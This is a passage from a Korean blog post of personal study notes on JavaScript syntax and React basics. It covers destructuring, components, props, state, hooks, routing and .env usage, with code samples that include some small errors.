선언된다.\nstr=\u0026#39;12345\u0026#39;\rA=5 string 문자열을 담는 변수로, 아래와 같은 함수들을 지원한다. contains(str) : 문자열 내에 주어진 문자열(str)이 포함되었는지 확인, 결과를 반환 배열 배열은 arr=[1, 2, 3] 과 같은 형태로 선언한다. arr=[,,,]과 같이 크기3(쉼표개수)의 배열 선언도 가능하지만, 배열의 요소는 undefined로 정의된다. arr = new Array(1,2,3)로 선언도 가능하다. 배열의 길이는 arr.length 로 추출 가능하다. 좌항에 배열 형태를 두어 배열의 요소를 각각 정의할 수 있다. [a, b, c] = [1, 2, 3] 이때, 일부 값을 무시할 수 있다. [a, , c] = [1, 2, 3] 전개 연산자(\u0026rsquo;\u0026hellip;\u0026rsquo;)을 이용하여 나머지 개체들을 통틀어 지정할 수 있다. [a, b, ...c] = [1, 2, 3, 4, 5] // a = 1, b = 2, c = [3, 4, 5] 전개 연산자 이후 다른 변수가 오면 오류가 난다. [a, b, ...c, d] = [1,2,3,4,5] // 오류 선언된 변수를 전개연산자로 다른 변수에 넣을수도 있다. ARRAY.indexOf(ITEM) : ARRAY 배열안의 ITEM의 index를 반환한다. var A = [1, 2, 3, 4, 5]\rvar B = [...A] // B = [1, 2, 3, 4, 5] 반복(순회) 배열 내용을 순회하는 방법은 다음과 같다. map 함수 var A = [1,2,3]\rA.map((a) =\u0026gt; {\r// 원하는 동작을 입력하면 된다.\r})\rA.map(Math.sqrt) // lambda함수 외 일반함수를 넣어도 된다. for-of var A = [1,2,3]\rfor (var a of A) {\r// java의 for( : ) 와 같다\r} 객체의 배열도 동일한 방법으로 순회가 가능하다. 다만 비구조화(destructing)가 포함된다. var B = [{a:1, b:2, c:3}, {a:4, b:5, c:6}]\rB.map({a,b,c} =\u0026gt; {\r// 원하는 동작 수행\r})\rfor (var {a:aa, b:bb, c:cc} of B) {\r// key가 마음에들지 않으면 재정의도 가능하다.\r} foreach map과 유사하게 동작한다. 하지만 map은 callback함수에서 조작한 내용으로 새로운 배열을 구성하고, foreach는 단순 반복만 수행한다. const lists = [\u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;3\u0026#39;]\rreturn(\r// map\r{lists.map(element =\u0026gt; {\rconsole.log(\u0026#39;name\u0026#39;, element);\rreturn \u0026lt;div\u0026gt; {element} \u0026lt;/div\u0026gt;\r})} // -\u0026gt; \u0026lt;div\u0026gt;1\u0026lt;/div\u0026gt;, \u0026lt;div\u0026gt;2\u0026lt;/div\u0026gt;, \u0026lt;div\u0026gt;3\u0026lt;/div\u0026gt; 이 화면에 출력되고, 로그가 출력된다. // foreach\r{lists.foreach(element =\u0026gt; {\rconsole.log(\u0026#39;name\u0026#39;, element);\rreturn \u0026lt;div\u0026gt; {element} \u0026lt;/div\u0026gt;\r})} // -\u0026gt; 화면에는 아무것도 나오지 않고 로그만 출력된다.\r) 비교 filter 함수를 이용하여 조건에 맞는 요소만 선택 가능하다. var a = [1,2,3,4,5,6,7]\rvar b = a.filter(i =\u0026gt; i \u0026lt; 4); // b = [1,2,3] 객체 Json형태로 이루어져 있다. var obj = {'a':10, b:20} key값은 \u0026lsquo;\u0026lsquo;를 붙여도 되고 안붙여도 된다. value를 변수로 추출할때는 다음과 같이 수행한다. 이를 비구조화라 한다. var {a,b,c} = {a:1, b:2, c:3} // a==1, b==2, c==3 비구조화시 기본값을 설정할 수도 있다. var {a=1,b=2} = {a:10} // a==10, b==2. b=2를 설정하지 않으면 b==undefined 다른 key를 사용하고싶다면 다음과 같이 수행한다. var {a:one, b:two} = {a:10, b:20, c:30} // one==10, two==20, c==30 key값으로 사용불가능한 값이 올 경우 다음과 같이 비구조화 한다. var {'a-b-c':a_b_c, [key]:A_B_C} = {'a-b-c':10, 'A B C':20} // a_b_c = 10, A_B_C = 20 재구조화시 전개 연산자를 사용할 수 있지만, 전개연산자를 재정의 할 수는 없다. {a:A, ...rest} = {a:10, b:20, c:30} // rest:B 는 불가능 unpack 전개 연산자 ... 을 사용하여 객체 내용을 나열할 있다. ex)\nconst obj = () =\u0026gt; {\rvar value = \u0026#34;value\u0026#34;;\rvar onChange = () =\u0026gt; {console.log(\u0026#34;onchange\u0026#34;)}\rreturn {value, onChange};\r}\r...\r// 아래 두 줄은 같은 효과를 가진다.\r\u0026lt;input placeholder=\u0026#34;\u0026#34; {...obj}\u0026gt;\u0026lt;input/\u0026gt;\r\u0026lt;input placeholder=\u0026#34;\u0026#34; value = {obj.value} onchange={obj.onChange}\u0026gt;\u0026lt;input/\u0026gt; 복사 배열 var a = [1,2,3]\rvar b = [...a] // 깊은복사\rvar [...c] = a // 깊은복사\rvar d = a // 얕은복사 객체 var A = {one:1, two:2, three:3}\rvar B = {...A} // 깊은복사 : one==1, two==2, three==3\rvar C = {...A, three:30} // 깊은복사+값 할당 : one==1, two==2, three==30 조건 특정 조건을 만족할 때에만 내용이 출력되도록 한다.\n{CONDITION \u0026amp;\u0026amp; \u0026lt;div\u0026gt; ! \u0026lt;/div\u0026gt;} // CONDITION 이 true일 때만 '!'를 표시한다. 3항 연산자 : C, java의 3항 연산자와 동일\n\u0026lt;span\u0026gt;{A ? \u0026quot;True\u0026quot; : \u0026quot;False\u0026quot;}\u0026lt;/span\u0026gt; \u0026amp;\u0026amp; : 앞의 내용이 참이면 뒤의 내용 수행\n\u0026lt;span\u0026gt;{A \u0026amp;\u0026amp; \u0026quot;True\u0026quot;}\u0026lt;/span\u0026gt; promise 비동기 처리시 사용하는 객체 promise 객체는 async와 wait를 이용한다. async function f1() {} : async 함수 선언, f1 함수는 비동기로 동작하고, 내부에 await 구문을 사용할 수 있다. const var = await f1() : async 함수가 완료될 때 까지 대기하도록 await로 명시 Component React는 js파일에서 정의한 컴포넌트를 html로 컴파일 한다. ex) \u0026lsquo;Subject\u0026rsquo;라는 이름의 component를 생성해 본다. 생성된 \u0026lsquo;Subject\u0026rsquo;는 custom tag가 된다. HTML에서 tag를 호출하듯 사용 가능하다. class형태로 만들기 class Subject extends Component {\rrender() {\rreturn (\r\u0026lt;header\u0026gt;\r\u0026lt;h1\u0026gt;Hello\u0026lt;/h1\u0026gt;\r\u0026lt;/header\u0026gt;\r);\r}\r} 함수 형태로 만들기 function Subject() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;Hello\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} -\u0026gt; 함수형은 자원을 덜 사용하고, 선언하기 쉬운 장점이 있다.\n\u0026lsquo;index.js\u0026rsquo;가 default라 가정하고, \u0026lsquo;App.js\u0026rsquo;에서 App 객체 안에 \u0026lt;Subject\u0026gt;\u0026lt;/Subject\u0026gt; 와 같이 태그를 생성한다. (다른 파일에 선언했다면 해당 파일을 \u0026lsquo;App.js\u0026rsquo;에서 참조 필요)\n※ \u0026lsquo;App.js\u0026rsquo; 파일은 확장자가 js이지만 코드 문법은 javascript가 아니다. props props를 활용하여 js파일에서 컴포넌트 태그 생성시 속성을 설정 가능하다.\n\u0026lt;Subject title=\u0026quot;TITLE\u0026quot;, content=\u0026quot;CONTENT\u0026quot;\u0026gt; : title 값으로 \u0026ldquo;TITLE\u0026rdquo;, content 값으로 \u0026ldquo;CONTENT\u0026rdquo; 설정\nSubject 객체 생성시 {this.prop.title}, {this.prop.content}와 같이 참조하여 사용한다.\nfunction Subject() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;{this.prop.title}\u0026lt;/h1\u0026gt;\r\u0026lt;h2\u0026gt;{this.prop.content}\u0026lt;/h2\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} 응용하여 아래와 같은 활용도 가능하다.\nfunction Subject() {\r{title, content} = {this.prop}\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;{title}\u0026lt;/h1\u0026gt;\r\u0026lt;h2\u0026gt;{content}\u0026lt;/h2\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} state props는 부모 컴퍼넌트가 자식에게 설정해 주는 값이라면, state는 컴퍼넌트가 자기 자신을 위해 사용하는 값이다. state는 함수형에서는 사용 불가능하고 클래스형에서 사용 가능하다. 대신 함수형에서는 \u0026lsquo;훅\u0026rsquo; 이라는 기능을 이용해 state와 유사한 효과를 낼 수 있다. state 세팅 constructor : 컴퍼넌트가 생성되었을 때 최초로 실행되는 함수. 초기화를 담당한다.\nclass App extends Component {\rconstructor(props) {\rsuper(props); // constructor 함수 기본\rthis.state : { // state 초기화\rsubject:{title:\u0026#34;TITLE\u0026#34;, content: \u0026#34;CONTENT\u0026#34;}\r}\r}\rrender() {\rreturn (\r\u0026lt;div ClassName = \u0026#34;APP\u0026#34;\u0026gt;\r\u0026lt;Subject title={this.state.subject.title} content={this.state.subject.content}\u0026gt;\u0026lt;/Subject\u0026gt; // html형태의 return값 안에서 javascript문법을 사용하려면 \u0026#39;{}\u0026#39;로 묶어준다.\r\u0026lt;/div\u0026gt;\r);\r}\r} -\u0026gt; App 컴퍼넌트가 생성되면 초기 설정된 state 값으로 Subject 컴퍼넌트를 생성한다.\nindex.js -\u0026gt; App.js -\u0026gt; Subject.js 순으로 호출이 이루어지는데, index.js에서는 App.js의 상태값을 알지 못한다. 즉, 부모에게 자신의 정보를 노출하지 않고 은닉한다. state로 배열 사용\nclass App extends Component {\rconstructor(props) {\rsuper(props); // constructor 함수 기본\rthis.state = { // state 초기화\rsubject:{title:\u0026#34;TITLE\u0026#34;, content: \u0026#34;CONTENT\u0026#34;},\rcontents:[\r{id:1, title:\u0026#39;title1\u0026#39;, desc:\u0026#39;desc1\u0026#39;},\r{id:2, title:\u0026#39;title2\u0026#39;, desc:\u0026#39;desc2\u0026#39;},\r{id:3, title:\u0026#39;title3\u0026#39;, desc:\u0026#39;desc3\u0026#39;},\r]\r}\r}\rrender() {\rreturn (\r\u0026lt;div ClassName = \u0026#34;APP\u0026#34;\u0026gt;\r\u0026lt;TOC data={this.state.contents}\u0026gt;\u0026lt;/TOC\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}\rclass TOC extends Component {\rrender() {\rvar lists = [];\rvar data = this.props.data;\rvar i = 0;\rwhile (i \u0026lt; data.length) {\rlists.push(\u0026lt;li key={i}\u0026gt;\u0026lt;a href={\u0026#34;/content/\u0026#34; + data[i].id}\u0026gt;{data[i].title}\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;)\r/*\r* 반복문을 통해 여러 객체를 만들 때, react에서는 \u0026#39;key\u0026#39;라는 유니크한 속성을 요구한다.\r*\r*/\ri = i + 1;\r}\rreturn (\r\u0026lt;nav\u0026gt;\r\u0026lt;ul\u0026gt;\r{lists} // lists에 \u0026lt;li\u0026gt;태그들을 넣어놓은 것들이 그대로 출력된다.\r\u0026lt;/ul\u0026gt;\r\u0026lt;/nav\u0026gt;\r);\r}\r} ※ react에서는 props나 state가 바뀌면, 이를 사용하는 하위 컴퍼넌트들의 render() 함수가 모두 다시 호출된다. 즉, 화면이 재구성된다.\nrender component 안의 render() 함수는 실제로 랜더링할 때 사용할 로직 및 html 형태를 반환한다. render() 함수 안에서 javascript로 로직 구현이 가능하다.\nex) 조건문 class App extends Component {\rconstructor(props) {\rsuper(props); // constructor 함수 기본\rthis.state = { // state 초기화\rmode: \u0026#39;read\u0026#39;\r}\rrender() {\rvar _mode = state.mode;\rif (_mode == \u0026#39;read\u0026#39;) { // 조건문\r} else if (_mode == \u0026#39;write\u0026#39;) {\r}\rreturn (\r\u0026lt;div ClassName = \u0026#34;APP\u0026#34;\u0026gt;\r\u0026lt;TOC data={this.state.contents}\u0026gt;\u0026lt;/TOC\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r} return render() 함수의 return 값은 html 형태가 되어야 한다. 하지만 return 안에서도 {} 구문 안에서 간단한 문법은 사용 가능하다. 조건문 3항 연산자 : C, java의 3항 연산자와 동일\n\u0026lt;span\u0026gt;{A ? \u0026quot;True\u0026quot; : \u0026quot;False\u0026quot;}\u0026lt;/span\u0026gt; \u0026amp;\u0026amp; : 앞의 내용이 참이면 뒤의 내용 수행\n\u0026lt;span\u0026gt;{A \u0026amp;\u0026amp; \u0026quot;True\u0026quot;}\u0026lt;/span\u0026gt; {``} : 문자열 편집, 문자열 안에 연산을 추가할 수 있다.\n\u0026lt;div className={`bg-white' ${flag ? 'flex' : 'flex-2'}\\`}\u0026gt; 이벤트 버튼 클릭, 내용 변경 등 사건이 발생했을 때, 이벤트 함수가 호출된다.\nonClick html에서 onclick은 \u0026lsquo;C\u0026rsquo;가 소문자이지만, react에서는 대문자이다.\nonClick은 인자로 함수를 받는다.\n인자로 들어가는 함수는 \u0026rsquo;event\u0026rsquo; 객체를 인자로 받는다. 이 함수를 이벤트 함수라 한다. class App extends Component {\rconstructor(props) {\rsuper(props); this.state = {}\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;a href=\u0026#34;/\u0026#34; onClick={function(e) {\rconsole.log(e); // 로그 찍는 방법\re.preventDefault(); // 해당 태그의 기본 클릭동작을 수행하지 않도록 한다.\r// \u0026#39;a\u0026#39; 태그의 경우 링크로 접속하는 동작을 막는다.\r}\r}\u0026gt;Click_here\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt;\r);\r}\r} 이벤트 함수 안에서 this.state.mode='write'와 같이 state를 변경하면 react가 변경 여부를 확인하지 못해 render()함수를 다시 호출하지 않아 화면이 갱신되지 않는다.\nthis.setState({mode:'write'});와 같이 state를 수정하도록 하자.\nonChange \u0026lsquo;input\u0026rsquo; 등 항목에서 내용이 변경되었을 경우\n아래와 같이 사용 가능\nconst onChange = (event) =\u0026gt; {\r// console.log(event.target.name);\rconst {target: {name, value}} = event; // get some values from \u0026#39;event\u0026#39;\r... +) bind\n이벤트 함수는 기본적으로 \u0026rsquo;this\u0026rsquo;를 가지지 않는다. 이때 강제로 this를 주입시키는 함수가 bind이다.\n이벤트 함수 안에서는 기본적으로 \u0026rsquo;this\u0026rsquo;를 호출해도 아무것도 bind되어있지 않다.\nonClick={function(e) { ... }.bind(this)} 와 같이 this를 bind해주면 this를 사용할 수 있게된다.\nvar obj = {name:\u0026#39;obj\u0026#39;};\rfunctiotn bindTest() {\rconsole.log(this.name);\r}\rbindTest(); // 아무 반응이 없다.\rbindTest.bind(obj); // obj가 bindTest의 this가 된다. +) custom event\n함수를 하위 컴퍼넌트에 전달해 준다.\nclass App extends Component {\rrender() {\rreturn (\r\u0026lt;div ClassName = \u0026#34;APP\u0026#34;\u0026gt;\r\u0026lt;Subject\rtitle={this.state.subject.title}\rcontent={this.state.subject.content}\ronChangePage={\rfunction(){\ralert(\u0026#34;page chaged\u0026#34;); // 경고창 출력\r}.bind(this);\r}\r\u0026gt;\r\u0026lt;/Subject\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}\rfunction Subject() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;a href=\u0026#34;/\u0026#34; onClick={ function(e) {\re.preventDefault();\rthis.props.onChangePage(); // 상위 컴퍼넌트로 부터 받은 함수 실행\r}\r\u0026lt;/div\u0026gt;\r);\r} 하위 컴퍼넌트를 수정하지 않고 하위 컴퍼넌트의 태그 클릭시 수행할 작업을 변경할 수 있다.\n하위 컴퍼넌트에서 상위 컴퍼넌트의 state를 변경할 수 있게 된다.\n라이프사이클 컴퍼넌트는 \u0026lsquo;마운트 -\u0026gt; 업데이트 -\u0026gt; 언마운트\u0026rsquo; 생명주기를 갖는다. 마운트 마운트 단계 메서드로는 다음이 존재한다. constructor : 생성시 호출되는 메서드 (생성자) getDerivedStateFromProps : props 값을 state에 넣는 메서드 render : UI를 렌더링 하는 메서드(화면 재구성) componentDidMount : 컴퍼넌트 랜더링 완료 후 호출되는 메서드 업데이트 컴퍼넌트가 업데이트 되는 경우는 아래의 경우들이 속한다.\nsetProps를 이용한 props변경시 setState를 이용한 state변경시 부모 컴퍼넌트가 리렌더링 될 시 this.forceUpdate로 강제 렌더링시 업데이트 단계의 메서드로는 다음이 존재한다.\ngetDerivedStateFromProps : props의 값을 state에 입력 shouldComponentUpdate : 컴퍼넌트의 변화를 인지하고, 랜더링 필요 여부를 판단. true: 랜더링 필요, false: 랜더링 불필요. render : 컴퍼넌트 리렌더링 getSnapshotBeforeUpdate : 컴퍼넌트 변화를 DOM에 반영하기 바로 직전에 호출되 메서드 componentDidUpdate : 컴퍼넌트 업데이트 작업이 끝난 후 호출되 메서드 언마운트 언마운트 단계의 메서드로는 다음이 존재한다. componentWillUnmount : 컴퍼넌트가 브라우저상에서 사라지기 직전 호출되는 메서드 this javascript 문법의 this와 동일하게 동작한다.\nclass 안에서는 this를 호출하면 class(컴퍼넌트)에 소속된 요소들에 접근할 수 있다.\n일반 function 안에서 this를 호출하면 자신이 종속된 객체에 접근한다.\narrow function 안에서 this를 호출하면 자신이 종속된 인스턴스(컴퍼넌트)에 접근한다.\nfunction func1() {\rthis.name = \u0026#34;func1\u0026#34;\rreturn {\rname : \u0026#34;return\u0026#34;\rarrow : () =\u0026gt; {\rconsole.log(this.name) // \u0026#39;func1\u0026#39; 출력\r}\rnormal : function() {\rconsole.log(this.name) // \u0026#39;return\u0026#39; 출력\r}\r}\r} hook class component에는 this.state가 있지만 function component 에서는 this.state가 없다. 대신 hook을 사용하여 동일한 기능을 수행한다. React에서는 built-in hook을 지원하고, 사용자가 직접 정의해서 사용할 수도 있다. hook의 조건 hook은 React 함수에서만 호출해야 한다. 일반 javascript 함수에서 호출하면 안된다. hook은 반복문, 조건문, nested function에서 호출되면 안된다. 위 두 조건을 이해하려면 hook의 동작 원리를 이해해야한다.\nReact는 컴퍼넌트를 처리할때 hook 함수들을 호출된 순서대로 관리한다.\n만약 컴퍼넌트를 업데이트할 때 hook 함수들의 순서가 변경된다면 React는 이를 정상적으로 처리하지 못한다.\n이때문에 hook은 항상 컴퍼넌트의 최상단에서 호출되어야 한다.\nhook의 종류 State Hooks import { useState } from 'react' 로 참조한다. [state, updateState] = useState( VALUE ): 컴퍼넌트에 VALUE값을 저장하고, 배열을 반환한다. \u0026lsquo;state\u0026rsquo; 는 VALUE 와 동일한 값이며, \u0026lsquo;updateState\u0026rsquo; 는 state값을 업데이트할 수 있는 함수 페어를 반환한다. \u0026lsquo;updateState\u0026rsquo; 는 this.setState와 유사한 효과를 가진다. VALUE값으로는 숫자, 문자열, 객체 모두 수용 가능하다. Effect Hooks import React, { useEffect } from 'react';로 참조한다.\ncomponentDidMount, componentWillUnmount 혹은 componentDidUpdate 와 유사한 효과를 발생시키며, 한 함수에서 여러번 선언 가능하다.\nuseEffect의 첫번째 인자로 함수가 들어가는데, 이 함수는 componentDidMount와 같은 시점에 동작된다.\nuseEffect의 첫번째 인자로 들어간 함수는 return값으로 함수를 반환하는데, 이 반환된 함수는 componentWillUnmount와 같은 시점에 동작된다.\nuseEffect의 두번째 인자로는 배열이 들어가고, 빈 배열을 넣을수도 있고, 값을 넣을수도 있다.\n이 배열 요소의 값이 바뀔경우 useEffect의 첫번째 인자로 들어간 함수를 실행시킨다. (componentDidUpdate와 유사하게 특정 변수가 변할때 rerendering을 할 수 있다.)\n또한, 이 배열 요소의 값이 바뀌기 직전, 첫번째 인자로 들어간 함수의 return 값이 실행된다.\n// return 없는 함수만 오는 경우\ruseEffect( () =\u0026gt; {\rconsole.log(\u0026#34;componentDidUpdate\u0026#34;);\r}\r// return 이 포함된 함수가 오는 경우\ruseEffect( () =\u0026gt; {\rconsole.log(\u0026#34;componentDidMount\u0026#34;);\rreturn (\r() =\u0026gt; { console.log(\u0026#34;componentWillUnmount\u0026#34;) }\r)\r})\r// 두번쨰 인자가 들어간 경우\ruseEffect( () =\u0026gt; {\rconsole.log(\u0026#34;\u0026#39;value\u0026#39; changed\u0026#34;);\rreturn (\r() =\u0026gt; { console.log(\u0026#34;value will be change\u0026#34;)}\r)\r}, [value]) class 의 componentdidMount와 같은 함수에 비해 간단하고 직관적으로 사용할 수 있다.\nContext Hooks useContext Reducer Hooks useReducer Custom Hooks hook을 담고 있는 사용자 정의 함수를 custom hook이라 칭한다. 반복되는 hook 호출 + 일련의 처리 과정을 하나의 함수로 묶어서 사용할 수 있다. 통념적으로 \u0026lsquo;use\u0026rsquo;로 시작하는 이름을 붙여준다. 호출된 custom hook도 일반 hook과 마찬가지로 중복해서 사용이 가능하며 각 hook들 끼리는 독립적이다. 6.Reference hook\nuseRef() 함수가 속한다. import { useRef } from 'react' 구문으로 참조 가능 랜더링과 독립적으로 변하지 않는 데이터를 저장한다. useRef는 변경될 시 페이지를 재 랜더링 하지 않는다. ref = useRef(null) 형태로 선언하며, reference object를 생성한다. null대신 저장하고싶은 데이터를 넣어도 된다. ref.current 로 저장한 데이터를 참조한다. ex) if (ref.current == null) useContext와 함께 사용하여 다른 component들에서 이 값을 참조하도록 할 수 있다. 객체 생성 후 값을 대입하려면 ref.current = data 형태로도 가능하다. \u0026lt;textarea ref={textareaRef}/\u0026gt; 형태로도 대입이 가능하다. textarea 객체 자체를 reference 하는 형태가 된다. \u0026lsquo;ref\u0026rsquo; 는 변수 명이 아니고 고정 속성값임에 주의 각종 모듈 package.json에 dependency를 기록해놓은 경우, npm install --legacy-peer-deps 명령으로 모든 dependency를 한번에 다운받을 수 있다. package.json에 기록되지 않는 모듈은 지워버리니 주의. Router SPA (Single Page Application) 에서 사용하지 않는 리소스를 로딩하느라 시간이 오래걸리는 것을 방지하기 위해, 소스를 분할처리하여 사용시에만 받을수 있게 하는 모듈\n설치 : npm install react-router-dom\n사용 :\nimport { HashRouter, Route, Routes, BrowserRouter} from \u0026#34;react-router-dom\u0026#34;;\rconst sample = () =\u0026gt; {\rreturn (\r\u0026lt;HashRouter\u0026gt;\r/* can add any components you want */\r\u0026lt;Routes\u0026gt;\r/* can only put \u0026#39;Route\u0026#39; components in \u0026#39;Routes\u0026#39; */\r\u0026lt;Route path=\u0026#34;/\u0026#34; element={\u0026lt;Home/\u0026gt;} /\u0026gt; // \u0026#39;/\u0026#39; 주소 호출시 Home component를 호출\r\u0026lt;Route path=\u0026#34;/about/*\u0026#34; element={\u0026lt;About/\u0026gt;} /\u0026gt; // \u0026#39;about\u0026#39; 및 \u0026#39;about/...\u0026#39; 형태의 주소 호출시 About component 호출\r/* add as you wish */\r\u0026lt;/Routes\u0026gt;\r\u0026lt;/HashRouter\u0026gt;\r);\r}; Route는 위에서부터 순차적으로 적용된다. if-else if 구문으로 생각하면 편하다.\n정규식 wild card *을 사용할 수 있다. (v5에서 exact 옵션 삭제되고 \u0026lsquo;*\u0026lsquo;로대체)\nroute 하는 대상에 props을 전달하고 싶다면,\nLink 특정 페이지로 경로를 전환해 주는 기능을 한다.\nreact-router-dom 모듈 안에 포함되어있다.\n\u0026lt;a\u0026gt; 태그와 동일한 역할을 하지만, React에서는 \u0026lt;a\u0026gt;를 사용하면 페이지를 새로 호출하여 React가 지니고 있던 상태들이 모두 초기화되기 때문에 \u0026lt;a\u0026gt; 태그 대신 link를 사용하는것이 맞다.\nlink는 페이지의 개념이고, button은 operation의 개념이다. 모두 event를 발생시킬 수 있지만 구분을 하는게 좋다.\n설치 : npm install react-router-dom\n사용 :\nimport { Link } from \u0026#34;react-router-dom\u0026#34;;\r...\r\u0026lt;Link to=\u0026#34;/\u0026#34;\u0026gt;Root\u0026lt;/Link\u0026gt; // 클릭하면 \u0026#39;/\u0026#39; 경로로 redirect 되는 Link 생성 Redirect react-router-dom에서 redirect를 지원하는 방법은 여러가지가 있다. Navigate 모듈 사용 :\nimport { HashRouter, Routes, Route, Navigate } from \u0026#34;react-router-dom\u0026#34;;\r...\r\u0026lt;HashRouter\u0026gt;\r\u0026lt;Routes\u0026gt;\r\u0026lt;Route path=\u0026#34;/\u0026#34; element={\u0026lt;Home/\u0026gt;}\r\u0026lt;Route path=\u0026#34;/about\u0026#34; element={\u0026lt;About/\u0026gt;}\r/* add as you wish */\r\u0026lt;Route path=\u0026#34;/index\u0026#34; element={\u0026lt;Navigate replace to=\u0026#34;/\u0026#34; /\u0026gt;} /\u0026gt; // \u0026#39;index\u0026#39; 페이지를 \u0026#39;/\u0026#39; 경로로 redirect\r\u0026lt;Route path=\u0026#34;*\u0026#34; element={\u0026lt;Navigate to=\u0026#34;/\u0026#34; /\u0026gt;} /\u0026gt; // 위에서 설정되지 않은 경로에 대해서는 모두 \u0026#39;/\u0026#39;로 redirect\r\u0026lt;/Routes\u0026gt;\r\u0026lt;/HashRouter\u0026gt; useHistory 사용 :\nconst history = useHistory();\rhistory.push(\u0026#34;/\u0026#34;); // \u0026#39;/\u0026#39; 경로로 redirect useNavigation 사용 :\nconst navigation = useNavigation()\rnavigation(\u0026#34;/\u0026#34;); // \u0026#39;/\u0026#39; 경로로 redirect cross-env 운영체제마다 환경변수 제공 방식이 달라 절대경로 표시가 어려웠던 점을 해결해주는 모듈 설치 : npm install cross-env --dev typeof react에서 기본적으로 제공하는 함수이다. ex)\nvar x = 1;\rif (typeof(x) === \u0026#39;number\u0026#39;) {\r...\r} 반환하는 결과값은 다음과 같다.\nundefined, object, number, boolean, bigint, string, symbol, function\n정의되는 값 참조\nDOM JSX에서 DOM을 조작하는 내용을 살펴보자 script 참조 javascript에서 아래와 같이 script를 추가할 수 있다.\n\u0026lt;script async defer src=\u0026quot;https://apis.google.com/js/api.js\u0026quot; onload=\u0026quot;gapiLoaded()\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;\nreact에서는 위 방식 대신, hook과 document 인자를 사용하여 아래와 같이 작성한다.\nconst [calendarApiLoaded, setCalendarApiLoaded] = useState(false);\ruseEffect( ()=\u0026gt; {\r// check api is loaded\rconst existingCheck = document.getElementById(\u0026#39;gapi\u0026#39;);\r// if not loaded, load\rif (!existingCheck) {\rconst gapiScript = document.createElement(\u0026#39;script\u0026#39;);\rgapiScript.src = \u0026#34;https://apis.google.com/js/api.js\u0026#34;\rconst gisScrpit = document.createElement(\u0026#39;script\u0026#39;);\rgisScrpit.src = \u0026#34;https://accounts.google.com/gsi/client\u0026#34;\r// merge two scripts\rgapiScript.append(gisScrpit);\rgapiScript.id = \u0026#39;gapi\u0026#39;;\r// append to body\rdocument.body.appendChild(gapiScript);\r// change state\rsetCalendarApiLoaded(true);\r}\r}); window 변수 window는 전역번수를 attach된 모든 script에서 접근할 수 있는 변수이며, react에서도 마찬가지로 window.value 혹은 window['value'] 형태로 접근이 가능하다. 기타 함수형, 클래스형 react는 함수형 방식과 클래스형 방식으로 작성할 수 있다. 최근에는 함수형 방식을 선호하는 추세이다. 함수형이 클래스형보다 메모리를 덜 사용한다. 다른 파일 참조 react에서 다른 파일을 참조할 때에는 \u0026lsquo;import\u0026rsquo;를 사용하며, 확장자가 없으면 \u0026lsquo;.js\u0026rsquo;가 생략된 것으로 본다.\nimport React, { Component } from \u0026quot;react\u0026quot;는 기본으로 필요하다. html에서 예약어로 사용하는 태그들은 \u0026lsquo;synamtic tag\u0026rsquo;라 한다. \u0026lsquo;h1\u0026rsquo;, \u0026lsquo;header\u0026rsquo;, \u0026rsquo;nav\u0026rsquo;, \u0026lsquo;article\u0026rsquo; 등이 있다. export : 특정 객체를 다른 파일에서 import할 수 있도록 한다.\nex) export App debugger라는 예약어는, chrome에서 실행할 때 break point역할을 한다. 개발시 코드로 break point를 설정할 수 있다. 추가 활용 이미지 첨부 이미지는 /resources 파일에 첨부하고, import로 가져와 사용할 수 있다.\n확장자가 없으면 js파일로 취급하니 확장자도 꼭 적어주도록 한다.\nimport screen_img from \u0026#39;../resources/screen_img.webp\u0026#39;\r...\r// INFO: React JSX에서 style 설정\rvar _style = {\r\u0026#39;top\u0026#39;: 0 //- scrollPos\r}\rvar _style_img = {\r\u0026#39;background-image\u0026#39;: \u0026#34;url(\u0026#34; + screen_img + \u0026#34;)\u0026#34;,\r\u0026#39;top\u0026#39;: -694 - scrollPos * 4/5\r}; key 숨기기 API key 등 사용자에게 드러내지 않고싶은 정보들을 react가 아닌 다른 곳에 저장해야 한다. react app에 저장하게 되면 개발 도구를 사용해 Client에서 어떻게든 내용을 확인할 수 있다. 다만, .env 파일에 따로 저장하게 되면 git에서는 나타나지 않게 설정할 수 있다. .env 파일 사용법 root 경로에 .env파일을 생성한다. .gitignore에 .env파일을 예외처리 한다. 정의하고 싶은 내용을 REACT_APP_ 뒤에 이어붙여 정의한다. (ex: REACT_APP_API_KEY) 정의한 내용은 react JSX에서 process.env.REACT_APP_API_KEY 형태로 사용 가능하다. Custom Tag Custom tag \u0026lsquo;CAT\u0026rsquo; 를 새로 만든다고 할때, \u0026lt;CAT name={name}/\u0026gt; 과 같이 생성하였다. Custom tag 안에 다른 내용을 집어넣고 싶으면, \u0026lt;CAT name={name}\u0026gt; {props.children} \u0026lt;/CAT\u0026gt; 형태로 사용하면 된다. Custom tag를 정의할 때, tag 사이에 든 child를 포함하여 아래와 같이 구조를 정의할 수 있다. const CAT ({child}) =\u0026gt; {\r\u0026lt;div\u0026gt;start\u0026lt;/div\u0026gt;\r{child}\r\u0026lt;div\u0026gt;end\u0026lt;/div\u0026gt;\r}; 참조 자바스크립트 문법 문법 Document React LifeCycle What \u0026amp; Why Hook\n","permalink":"https://aswinblue.github.io/Blog/post/webapplication/react_basic/","summary":"React basic 개발환경 설치 및 실행 node.js 로 만들어진 create-react-app 툴을 이용하면 손쉽게 react 앱을 생성할 수 있다. npm을 설치하고 아래 명령어를 수행하여 create-react-app을 설치한다. npm install -g create-react-app 원하는 경로에 들어가 프로젝트를 생성한다. create-react-app \u0026lt;NAME\u0026gt; : NAME 경로에 프로젝트 생성 주의 : 프로젝트가 생성되는 폴더명은 대문자를 사용할 수 없다. 실행 npm run start 를 수행하면 localhost:3000에서 웹페이지를 퍼블리싱한다. 기본 설정 실행 